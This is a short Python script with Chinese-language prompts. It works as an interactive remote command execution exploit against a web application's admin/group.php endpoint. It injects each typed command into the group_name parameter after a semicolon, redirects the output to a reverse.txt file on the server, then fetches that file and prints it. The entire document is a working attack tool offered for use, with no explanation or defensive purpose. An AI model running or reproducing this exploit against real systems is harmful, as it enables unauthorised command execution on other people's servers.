import requests

url = input("请输入目标地址(url):")

while True:
    cmd = input("请输入要执行的命令(command): ")

    # 构造命令执行请求
    cmd_request = requests.get(url + "admin/group.php?memberid=root&cmd=add&group_name=d;" + cmd + "%3Ereverse.txt")
    reversed_request = requests.get(url + "/admin/reverse.txt")
    content = reversed_request.text

    # 打印命令执行结果
    print(content)

    # 如果输入 "exit"，则退出循环
    if cmd == "exit":
        break
